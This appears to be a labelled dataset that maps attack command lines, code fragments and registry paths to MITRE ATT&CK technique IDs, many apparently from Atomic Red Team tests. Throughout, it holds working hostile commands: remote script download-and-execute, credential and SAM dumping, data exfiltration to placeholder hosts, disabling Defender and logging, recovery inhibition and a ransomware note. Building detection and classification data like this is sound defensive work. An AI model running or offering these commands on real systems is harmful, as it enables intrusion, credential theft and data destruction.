idHook,T1106
"cmd /r cmd<""$input_file""",T1059
foreach ($account in $storageAccounts) {,T1619
"api_option = ""paste""",T1567
cmdkey,T1555
Process = if ($p) { $p.ProcessName } else { $null },T1049
audioddg.pdb,T1036
"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target_binary"" /v Debugger /d ""$payload_binary""",T1546
username,T1136
"$sheet.Cells.Item(18,1) = ""=FWRITELN(A5, `""End If`"")""",T1204
sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD),T1490
"systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'",T1053
"New-ItemProperty $ExcelRegPath ""Path"" -value ""notepad.ppam"" -propertyType string | Out-Null",T1137
New-UserPersistenceOption,T1547
{$Response = $_.Exception.Response.GetResponseStream(),T1619
<PID>/mem,T1003
%COMMONPROGRAMFILES%\Microsoft Shared\wmi\,T1036
"esentutl.exe /y ""%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"" /d ""$output_path""",T1555
HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest,T1112
LANG,T1614
nc -nv $host $port,T1046
$SI,T1070
bcdedit.exe,T1490
cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*,T1567
"Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""",T1555
bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,T1564
HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData,T1012
"Copy-Item -Path ""$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe"" -Destination ""$Env:windir\System32\Tasks\notepad.exe""",T1218
"cmd.exe /c net group ""Domain Admins"" /domain",T1069
"echo ""OnCalendar=*-*-* *:*:00"" >> $path_to_systemd_timer",T1053
Gpscript /logon,T1218
$xlApp.Quit(),T1204
Win32_PnPEntity,T1082
gcloud projects get-iam-policy,T1087
esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o,T1564
touch -a -t 197001010000.00 $target_filename,T1070
certutil -addstore my $pfx_path,T1553
networksetup -setwebproxy $interface $proxy_server $proxy_port,T1090
GetKeyboardType,T1614
$result | Out-File -Encoding ASCII -append $file,T1016
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f,T1112
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:{REMOTEURL}"")",T1218
Stop-Service -Name EventLog,T1562
$word.Visible = $false,T1137
netsh.exe advfirewall show currentprofile,T1518
java,T1036
DnsQuery_A,T1106
CreateFile,T1106
find $search_path -name id_rsa 2>/dev/null -exec rsync -R {} $output_folder \;,T1552
GetProcessById,T1106
Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing,T1204
GetNativeSystemInfo,T1082
%APPDATA%\..\Local\Temporary Internet Files\Content.Word,T1070
~/Library/LaunchAgents/,T1543
systemctl start $systemd_timer_name,T1053
sc config WinDefend start=disabled,T1562
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"" -Name ""UpdateXMLUrlFromOC"" -Value ""$remote_url"" -Type String -Force",T1105
"Boot, System",T1485
useradd -M -N -r -s /bin/bash -c evil_account $username,T1136
RmShutDown,T1489
PostMessage,T1055
"sftp -o ProxyCommand=""{CMD}"" .",T1202
"$instance.Document.Application.ShellExecute($driveLetter+"":\document.lnk"","""",$driveLetter+"":\"",$null,0)",T1553
TrustedHosts,T1021
loadfrommem,T1055
catch { $_; exit $_.Exception.HResult},T1036
"echo ""2. Paste this link - https://akira.onion"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
/bin/sh -c,T1059
printf,T1497
"Write-Host ""SeDebugPrivilege enabled successfully."" -ForegroundColor Green",T1562
~/Library/,T1543
rcsi.exe {PATH:.csx},T1127
"if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;",T1016
netsh advfirewall set currentprofile state off,T1562
"echo ""*** Delivery channel deleted ***""",T1562
connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name,T1114
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe,T1219
takeown /F C:\Windows\System32\sethc.exe /A,T1546
wmic MEMPHYSICAL get MaxCapacity,T1082
set comspec={PATH_ABSOLUTE:.exe} & cscript c:\windows\system32\manage-bde.wsf,T1216
net start w32time,T1547
C:\Windows\System32\winevt\logs\,T1070
timeout 20,T1497
sudo cp $script_location $script_destination,T1543
Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue,T1098
"IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)",T1053
netsh wlan show,T1016
cp /bin/sh /tmp/crond;,T1036
$NewClass.Put(),T1047
System info.txt,T1560
"set-servicebinarypath -name ""$service_name"" -path ""$new_bin_path""",T1543
w32tm /tz,T1124
$User.Enabled = $True,T1136
"Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore",T1070
Update.exe --removeShortcut={PATH:.exe}-l=Startup,T1070
"$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program ""$hollow_binary_path"" -debug",T1055
} catch { return $false },T1083
Start-NetEventSession -Name Capture007,T1040
"$which_python -c ""import tarfile; output_file = tarfile.open('$path_to_output_file','w'); output_file.add('$path_to_input_file'); output_file.close()""",T1560
procdump.exe -md {PATH:.dll} explorer.exe,T1202
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'",T1546
net user art-test /add,T1078
Microsoft.IdentityServer.Servicehost.exe.config,T1556
"pnputil.exe /add-driver ""$driver_inf""",T1547
nltest /domain_trusts /all_trusts,T1482
net user $ ATOMIC123! /add /active:yes,T1564
echo $fish_encoded | base64 -d | bash,T1140
Winlangdb.pdb,T1036
pam_unix.so,T1556
"Set-ItemProperty -Path $registryPath -Name ""ServiceDll"" -Value $newServiceDll",T1505
cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/,T1110
"compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force",T1555
using System.Runtime.InteropServices;,T1491
querySpn.vbs,T1087
klist,T1558
testcat(){ (while read line; do echo $line >> $output_file; done < $1) },T1003
"if($member -like ""*Administrator*"") {",T1098
"echo ""Manipulated data"" > ~/Library/Mail/copy/manipulated.txt",T1070
HKLM\SYSTEM\CurrentControlSet\Services\DeviceSync\,T1543
mstsc /v:$Server,T1021
GetProcessesByName,T1057
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""",T1137
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug,T1055
Start-Process $file1 /S;,T1219
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1012
and/or,T1070
net user,T1087
CreateProcessA(),T1106
$ACL.SetAccessRule($accessRule),T1505
"$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()",T1539
systemctl restart T1543.002,T1543
/usr/bin/security dump-keychain -d,T1555
system account remove,T1531
test.gif,T1036
sudo cat /usr/local/etc/sudoers,T1548
"net group ""BUILTIN\Backup Operators"" /domain",T1069
mshta,T1218
"Write-Host ""Done!""",T1567
DNSGetCacheDataTable,T1018
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServices""",T1012
"cmd.exe /c ""$local_folder\$local_executable"" kerberoast $flags /outfile:""$local_folder\$out_file""",T1558
bcdedit /set {default} recoveryenabled No,T1490
check_registry_keys,T1012
WSARecv,T1106
Connect-AzureAD -Credential $Credential 2>&1> $null,T1110
C:\windows\system32\drivers\etc\hosts,T1556
ProtocolHandler.exe {REMOTEURL},T1105
icacls,T1222
kubectl run $pod_name --image=$image_name --restart=Never --rm -it -- curl -ksL $remote_url,T1105
makecab /F {PATH:.ddf},T1036
osascript /path/to/script,T1059
eoffice.exe,T1036
showmount $computer_name,T1135
echo $PWD_SPOOF,T1056
HKLM\SAM\SAM\Domains\Account\F,T1003
"reg add ""HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"" /ve /d "".pwn"" /f",T1548
"Write-Host -ForegroundColor Yellow ""You must store the password of the current user by running the prerequisite commands first""",T1098
echo %APPDATA%,T1083
GMER64.sys,T1562
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,T1564
"Stop-Process -Name ""WebBrowserPassView""",T1555
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /ve /T REG_SZ /d ""C:\WINDOWS\system32\scrobj.dll"" /f",T1546
Invoke-WebRequest $pua_url -OutFile $pua_file,T1204
Connect-AzureAD -Credential $Credential,T1082
WorkFolders,T1218
Set-AADIntUserMFA,T1556
credphisher.py,T1056
vim-cmd vmsvc/snapshot.removeall,T1490
sudo cp $path_malicious_plist /Library/LaunchAgents/$plist_filename,T1543
echo $HISTSIZE,T1562
attrib.exe -r $file_or_folder\*.* /s,T1222
"reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\$ETWProviderGUID"" /v ""Enabled"" /t REG_DWORD /d ""0"" /f",T1562
sudo srm -r $system_log_folder #recursive deletion of log files,T1070
PTRACE_POKEDATA,T1055
diantz,T1560
"find / -path ""*/Safari/Bookmarks.plist"" 2>/dev/null >> $output_file",T1217
Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue,T1098
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages,T1547
"ren ""%temp%\upload"" audiodg.exe",T1036
"New-Item -ItemType Key -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer""",T1547
appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml},T1127
"C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;$command_to_execute""",T1216
netsh advfirewall firewall,T1518
sed -i '$ a #art_test_1562_006_1' /etc/audisp/$audisp_config_file_name,T1562
attrib.exe +h $file_to_modify,T1564
-NoProfile,T1546
"echo ""[Install]"" >> $systemd_service_path/$systemd_service_file",T1543
echo 'uname -a' >> /tmp/art_payload.sh,T1027
$content | Set-Content -Path $tmpFunctionCode # Write the modified content to the file,T1528
foreach($container in $containers) {,T1619
Disable-AntiPhishRule -Identity $test.Name -Confirm:$false,T1562
&lt;user-home&gt;/.ssh/authorized_keys,T1098
"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""",T1202
_VBA_PROJECT,T1564
/proc/locks,T1057
LocalCommand,T1202
$PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug,T1106
odbcconf -f {PATH:.rsp},T1218
"Mount-DiskImage -ImagePath ""$env:TEMP\qbot-test.iso""",T1204
show flash,T1083
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
/Network/Library/Keychains/,T1555
wmic group get name,T1069
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL,T1574
foreach ($port in $ports) {,T1016
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs"" /v Configuration /t REG_SZ /d malware_test /f",T1546
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIntrusionPreventionSystem"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
ping -c $ping_count 8.8.8.8 > /dev/null,T1497
HKCU\Software\Microsoft\Office test\Special\Perf,T1137
.desktop,T1547
chmod +x $script_path,T1059
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security"" /v Level /t REG_DWORD /d 1 /f",T1137
echo 'import os' >> $python_script_name,T1059
mkdir -p $test_folder,T1560
del %TEMP%\redcanary.cab >nul 2>&1,T1105
su nobody,T1078
kubectl run $pod_name --image=$image_name --restart=Never --rm -it -- sh -lc 'adduser -D $username && id $username',T1136
"InstallUtilPath = ""$Env:windir\System32\Tasks\notepad.exe""",T1218
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -sc dclist",T1018
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""list all"" ""mount 1"" ""quit"" ""quit""",T1003
sitemanager.xml,T1005
"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember ""Domain Admins""",T1069
"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableRemoteDesktopAntiAlias"" /t REG_DWORD /d 1 /f",T1112
"grep -i ""PASS"" ""$output_file""",T1003
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},T1105
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses $optional_args",T1087
Extexport.exe {PATH_ABSOLUTE:folder} foo bar,T1218
"Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""",T1098
"ssh localhost ""{CMD}""",T1202
3e2717e8b3873b29,T1027
sc.exe stop $service_name,T1489
copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y,T1036
0x53D525,T1057
"mshta.exe javascript:a=GetObject(""script:{REMOTEURL:.sct}"").Exec();close();",T1218
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableChangePassword /t REG_DWORD /d 1 /f",T1112
HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run,T1547
directories of the user owned directories (,T1543
schtasks.exe /F /Create /TN Microsoft_Licensing /sc minute /MO 1 /TR C:\\Users\\Public\\Libraries\...,T1053
RegisterServiceCtrlHandler,T1106
if $(printenv SHELL >/dev/null); then printenv SHELL; fi,T1059
$totalports++ | Out-Null,T1016
"Write-Host ""Error: domain """"$domain_name"""" not verified""",T1484
nohup,T1564
ticketer.py,T1558
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force",T1484
for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/$host/$port) && echo port $port is open ; done,T1046
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnceEx""",T1012
"sudo lsmod | grep -i ""vmw_baloon\|vmxnet""",T1082
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'""",T1491
taskhostsvc.exe,T1036
tftp,T1105
az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString,T1530
reg query HKLM\SYSTEM\CurrentControlSet\Services\[service name]\Parameters,T1012
match keys,T1546
Connect-AzAccount -Credential $Credential,T1082
AdjustTokenPrivilege,T1134
C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup,T1547
Evil.txt.exe,T1036
"Write-Host ""Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)""",T1098
/Library/LaunchDaemons,T1053
CreateToolHelp32Snapshot(),T1057
"New-ItemProperty ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" -Name T1112 -Value ""<script>""",T1112
takeown /F,T1222
"$wc.DownloadFile($url, $imgLocation)",T1491
%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\,T1555
dir /s * .xml,T1552
"$which_python -c ""import bz2;input_file=open('$path_to_input_file','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('$path_to_output_file','w+');output_file.write(str(bz2content));output_file.close();""",T1560
public struct TOKEN_PRIVILEGES {,T1562
find $search_path -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} $output_folder \;,T1552
"rundll32.exe keymgr,KRShowKeyMgr",T1003
finger base64_filedata@$remote_host,T1105
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore,T1558
type C:\Windows\Panther\Unattend\unattend.xml,T1552
/Library/Application Support/com.apple.TCC/TCC.db,T1548
Invoke-WCMDump,T1555
netsh.exe advfirewall firewall dump,T1518
if [ -f /etc/mtab ]; then cat /etc/mtab >> $output_file; fi;,T1083
mdfind,T1083
qwinsta.exe /server:$computer_name,T1033
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender"" -NoRestart -ErrorAction Ignore",T1562
HKEY_CURRENT_USER\Console\QuickEdit,T1012
"dsquery * -filter ""(objectClass=trustedDomain)"" -attr *",T1482
"[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9",T1048
lsd,T1083
python.exe,T1059
reg export HKLM\sam %temp%\sam,T1003
ZwAlertResumeThread,T1055
$User.SetPassword($TempCred.GetNetworkCredential().Password),T1136
Set-MpPreference -dbaf $True,T1562
"Invoke-Sharpweb -command ""all""",T1555
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v EnableSmartScreen /t REG_DWORD /d 0 /f",T1484
%tmp%/T1106.exe,T1106
Pcwrun.exe /../../$(calc).exe,T1202
"schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1"" /tn win32times /f",T1036
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force",T1547
"usermod --expiredate ""1"" art",T1078
ConfigSecurityPolicy.exe {REMOTEURL},T1105
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1""",T1619
else sed -i '$ a #art_test_1562_006_1' /etc/audit/$auditd_config_file_name,T1562
"New-InboxRule -Name ""$rule_name"" -ForwardTo ""$forwarding_email""",T1114
$requiredGraphAccess.ResourceAppId = $graphSP.AppId,T1098
"reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""",T1012
wmiexec.vbs,T1047
WTSEnumerateSessionsW,T1049
usr/local/bin,T1543
then,T1562
"find / -path ""*/Google/Chrome/*/Bookmarks"" -exec echo {} >> $output_file \;",T1217
SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths,T1518
[System.GC]::Collect(),T1204
netstat.exe -f,T1049
"sudo touch /tmp/system-auth.bk sudo echo ""session required pam_tty_audit.so",T1056
$handle | get-member -erroraction silentlycontinue | out-file $output_file -append,T1012
"if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""netstat -Sp tcp""; else cmd=""netstat -ant""; fi;",T1016
"Write-Host ""[i] IP Address List: $ip_list""",T1046
GetLocalTime,T1124
Sort-Object LastWriteTime -Descending |,T1562
/etc/krb5.conf,T1558
ls -R | select-string -ErrorAction SilentlyContinue -Pattern password,T1552
ls -recurse,T1083
"echo -n ""$ART"" | $decodecmd |/bin/bash",T1059
ExitWindowsEx,T1529
ListAttachedRolePolicies,T1069
"strings ""$output_file"" | grep -i PASS",T1003
“%AppData%\{Unique Identifier}\NEWERSSEMP”,T1074
"""$rar_exe"" a -r $output_file $input_path\*$file_extension",T1560
net users,T1087
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose,T1134
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f,T1112
support_388945a0,T1036
ren %APPDATA%\amsi.dll WinAppXRT.dll,T1574
GetAdaptersAddresses.,T1018
ZwUnmapViewOfSection,T1055
cp $payload /tmp/cap.c,T1548
New-Item -ItemType Key -Path $path,T1546
fltmc.exe | findstr.exe 385201,T1518
"$sheet.Cells.Item(9,1) = ""=FWRITELN(A5, `""winHttp.Open `""`""GET`""`"", url, False`"")""",T1204
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1'),T1055
".(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in",T1070
Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName $module_name -ModulePath $module_path,T1218
AppLauncher.exe {PATH_ABSOLUTE:.exe},T1127
ApplicationImpersonation,T1548
ScreenConnect,T1219
Start-Sleep -s 10,T1204
"Invoke-WebRequest $domain -UserAgent ""*<|>*"" | out-null",T1071
set.bat,T1059
pcalua.exe -a $payload_path,T1202
Invoke-Mimikatz,T1547
sudo launchctl unload $falcond_plist,T1562
winget,T1105
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity"" /v ""Enabled"" /t REG_DWORD /d 0 /f",T1562
"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",T1218
C:\Windows\system32\attrib.exe” +h C:/rjtu/,T1564
$document.SaveAs($docPath),T1137
"& ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -accepteula \\$target -w c:\ -c ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgt /user:$user_name /password:$password /domain:$domain /outfile:ticket.kirbi",T1550
conhost.exe {CMD},T1202
System.Management.Automation,T1059
GetKeyState,T1106
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v http /t REG_DWORD /d 0 /F",T1112
dotnet -consoleoutput -noninteractive,T1518
curl -O $remote_url/sqlite_dump.sh,T1005
~/.zshrc_aliases,T1546
tell application “System Events” to make login item at end with properties /path/to/executable,T1547
/tmp/.temp.data,T1074
xattr -d com.apple.quarantine,T1553
LastWriteTime,T1070
"ssh $domain ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz",T1048
C:\system,T1074
/.mozilla/firefox/,T1555
net use,T1049
cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f,T1112
DevTunnel.exe,T1105
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll"" /f",T1137
"reg add ""HKCU\Software\Policies\Microsoft\Windows\OOBE"" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f",T1562
"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\$weak_service_name"" /f /v ImagePath /d ""$malicious_service_path""",T1574
instructions.ini,T1027
dsquery,T1087
PSVERSION,T1082
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""",T1012
Copy-Item -Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd,T1546
ngen.exe {REMOTEURL},T1105
%temp%\T1036.007_masquerading.png.vbs,T1036
"echo ""[Timer]"" >> $path_to_systemd_timer",T1053
EnumChildWindows,T1106
"New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter",T1098
ResourceGroup = $account.resourceGroup,T1619
.\rclone.exe config create $remote_share mega,T1567
bluekeep -noninteractive -consoleoutput,T1046
IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd ),T1546
[System.IO.Directory]::EnumerateFiles($root) | ForEach-Object {,T1083
Kaspersky Update Agent,T1036
taskmgr,T1036
Start-Sleep -Second 20,T1134
--exclude,T1562
company administrator,T1098
"$excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")",T1137
"cmstp.exe /s ""$inf_file_path""",T1218
libtomcrypt,T1027
"set-content -path $file_name -stream $ads_filename -value ""test2""",T1564
"Start-Process ""C:\Windows\System32\fodhelper.exe""",T1548
"aws iam create-access-key --user-name $username > ""$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds""",T1098
FSCTL_MOVE_FILE,T1485
xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_=,T1027
CreateKeyPair,T1098
Taskmgr.exe,T1134
Get-ManagementRoleAssignment,T1069
cbd.exe,T1070
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force,T1548
"echo ""[Service]"" >> $path_to_systemd_service",T1053
fsianycpu.exe,T1059
"cd ""PathToAtomicsFolder\..\ExternalPayloads""",T1087
find . -type f -iname *.pdf >> $output_file,T1083
Dxcap.exe -c {PATH_ABSOLUTE:.exe},T1127
auditctl -D,T1562
"%TEMP%\AdvancedRun.exe"" /EXEFilename ""C:\Windows\System32\sc.exe"" /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory """" /RunAs 8 /Run",T1134
New-MailboxExportRequest.,T1114
"su -c ""whoami"" nobody",T1078
"if ($app -eq $null) { Write-Warning ""Application not found""; exit }",T1098
%windir%\system32\inetsrv\appcmd.exe install module /name:$module_name /image:$dll_path,T1505
w3wp.exe,T1036
Update.exe --createShortcut={PATH:.exe} -l=Startup,T1547
anonymfiles.com,T1567
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskmgr /t REG_DWORD /d 1 /f",T1112
"Write-Host ""Waiting 2s before putting $processName in the comma"" -ForegroundColor Yellow",T1562
Dropbox Update Setup,T1547
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force,T1491
"if (test-path ""$FirefoxCredsLocation\logins.json"") {copy-item ""$FirefoxCredsLocation\logins.json"" -destination ""$exfil_folder\T1555.003Firefox_logins.json""} else {}",T1555
nmap,T1046
"Write-Host ""Waiting 5s before putting $processName in the comma"" -ForegroundColor Yellow",T1562
CreateMutexW(),T1480
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
$ShortCut.Save(),T1547
head,T1140
Dij,T1055
security import $cert_export -k,T1555
namespace Win32{,T1491
"az storage blob upload --connection-string $connectionString --container-name ""$container_name"" --name ""$blob_name"" --file ""$file_path_blob"" --overwrite true",T1528
pty,T1059
"net group ""enterprise admins"" /domain",T1069
"objws.Run ""notepad.exe"", 0, True",T1546
sudo $compiled_file $source_file,T1222
Process32First,T1106
"$sheet.Cells.Item(12,1) = ""=FWRITELN(A5, `""Set oStream = CreateObject(`""`""ADODB.Stream`""`"")`"")""",T1204
dseditgroup -o edit -a art-user -t user admin,T1078
copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll,T1574
truncate -s +1 $file_to_pad #adds a byte to the file size,T1027
} catch [System.UnauthorizedAccessException] {,T1083
ECHO Let's open the Computer Management console now...,T1053
"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi;",T1069
RtlGetVersion,T1082
kl.ps1,T1056
IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd ),T1546
"wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\""ATOMICREDTEAM\""",T1562
foreach($queue in $queues) {,T1619
taskkill /im notepad.exe /t /f > NUL 2>&1,T1546
echo '' >> $rc_service_path/$rc_service_file,T1543
HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System,T1012
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common,T1037
0xAA,T1027
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'",T1546
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt},T1105
~/Library/Cookies/Cookies.binarycookies,T1539
unlink,T1070
Info.plist,T1547
Stop-Process -ID $myT1036_003,T1036
"ContainerName = """"",T1619
New-VM -Name $VM -Generation 2,T1564
